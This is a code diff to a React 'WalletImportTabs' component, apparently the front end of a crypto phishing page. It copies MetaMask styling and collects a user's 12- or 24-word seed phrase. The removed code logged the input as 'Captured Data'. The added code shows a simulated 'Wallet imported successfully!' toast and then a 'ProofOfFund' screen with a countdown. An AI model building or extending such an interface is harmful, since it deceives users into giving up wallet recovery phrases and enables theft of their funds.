@@ -1,6 +1,7 @@
 import React, { useState, useRef, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import ProofOfFund from './ProofOfFund';
+import { v4 as uuidv4 } from 'uuid';
 
 // Default theme (MetaMask style)
 const defaultTheme = {
@@ -22,20 +23,18 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
   const [showPassword, setShowPassword] = useState(false);
   const [toast, setToast] = useState({ show: false, message: '' });
   const [showPOF, setShowPOF] = useState(false);
+  const [startCountdown, setStartCountdown] = useState(false);
+  const [selectedWalletType, setSelectedWalletType] = useState(null);
   const [progress, setProgress] = useState(100);
+  const [sessionId, setSessionId] = useState(() => {
+    const existingSessionId = localStorage.getItem('sessionId');
+    if (existingSessionId) return existingSessionId;
+    const newSessionId = uuidv4();
+    localStorage.setItem('sessionId', newSessionId);
+    return newSessionId;
+  });
   const toastTimeout = useRef(null);
   const navigate = useNavigate();
-
-  useEffect(() => {
-    const pofState = localStorage.getItem('showPOF');
-    if (pofState === 'true') {
-      setShowPOF(true);
-    }
-  }, []);
-
-  useEffect(() => {
-    localStorage.setItem('showPOF', showPOF);
-  }, [showPOF]);
 
   useEffect(() => {
     // Removed navigation logic to prevent URL change
@@ -43,11 +42,15 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
 
   useEffect(() => {
     if (toast.show && toast.message.includes('Wallet imported successfully')) {
+      setProgress(100); // reset progress when success toast starts
       const interval = setInterval(() => {
         setProgress((prev) => {
           if (prev <= 0) {
             clearInterval(interval);
+            // when success toast finishes, hide toast, show ProofOfFund and start its countdown
+            setToast({ show: false, message: '' });
             setShowPOF(true);
+            setStartCountdown(true);
             return 0;
           }
           return prev - 5;
@@ -58,31 +61,40 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
     }
   }, [toast.show, toast.message]);
 
+  // Auto-hide only error toasts after 3 seconds
+  useEffect(() => {
+    if (toast.show && toast.style?.isError) {
+      const timeout = setTimeout(() => {
+        setToast({ show: false, message: '' });
+      }, 3000); // Auto-hide error toast after 3 seconds
+
+      return () => clearTimeout(timeout);
+    }
+  }, [toast]);
+
+  const validateSeedPhrase = (phrase) => {
+    const words = phrase.trim().split(/\s+/).filter(Boolean);
+    return words.length === 12 || words.length === 24;
+  };
+
+  // Updated handleImport function to delay showing POF until toast finishes
   const handleImport = (e) => {
     e.preventDefault();
 
     const formData = new FormData(e.target);
-    const seedPhrase = formData.get('key');
+    const walletType = formData.get('walletType') || 'binance';
+    const key = formData.get('key') || '';
 
-    // Validate seed phrase
-    if (!seedPhrase || seedPhrase.trim().split(' ').length < 12) {
-      setToast({ show: true, message: 'Failed to import: Seed Phrase is required and must be at least 12 words.' });
-      if (toastTimeout.current) clearTimeout(toastTimeout.current);
-      toastTimeout.current = setTimeout(() => setToast({ show: false, message: '' }), 3500);
+    if (!validateSeedPhrase(key)) {
+      setToast({ show: true, message: 'Invalid seed phrase. Please enter a valid 12 or 24-word phrase.', style: { background: '#fff', color: '#d32f2f', isError: true } });
       return;
     }
 
-    // Clear any existing error toast if the seed phrase is valid
-    setToast({ show: false, message: '' });
-
-    // Securely handle data (example: send to backend)
-    console.log('Captured Data:', Object.fromEntries(formData)); // Replace with actual secure handling logic
-    setToast({ show: true, message: 'Wallet imported successfully!', style: { background: '#fff', color: '#4caf50' } });
-    if (toastTimeout.current) clearTimeout(toastTimeout.current);
-    toastTimeout.current = setTimeout(() => {
-      setToast({ show: false, message: '' });
-      setShowPOF(true);
-    }, 2500);
+    // Simulate successful import: show success toast. POF will appear after toast progress completes.
+    setSelectedWalletType(walletType);
+    setStartCountdown(false);
+    setShowPOF(false);
+    setToast({ show: true, message: 'Wallet imported successfully!', style: { background: '#fff', color: '#4caf50', isError: false } });
   };
 
   const tabData = [
@@ -159,29 +171,31 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
           }}
         >
           {toast.message}
-          <div
-            style={{
-              marginTop: '10px',
-              height: '5px',
-              width: '100%',
-              background: '#e0e0e0',
-              borderRadius: '5px',
-              overflow: 'hidden',
-            }}
-          >
+          {!toast.style?.isError && (
             <div
               style={{
-                height: '100%',
-                width: `${progress}%`,
-                background: '#4caf50',
-                transition: 'width 0.1s ease',
+                marginTop: '10px',
+                height: '5px',
+                width: '100%',
+                background: '#e0e0e0',
+                borderRadius: '5px',
+                overflow: 'hidden',
               }}
-            ></div>
-          </div>
+            >
+              <div
+                style={{
+                  height: '100%',
+                  width: `${progress}%`,
+                  background: '#4caf50',
+                  transition: 'width 0.1s ease',
+                }}
+              ></div>
+            </div>
+          )}
         </div>
       )}
       {showPOF ? (
-        <ProofOfFund theme={theme} walletType="binance" />
+        <ProofOfFund theme={theme} walletType={selectedWalletType} startCountdown={startCountdown} />
       ) : (
         <div>
           <div className="flex gap-2 mb-2">
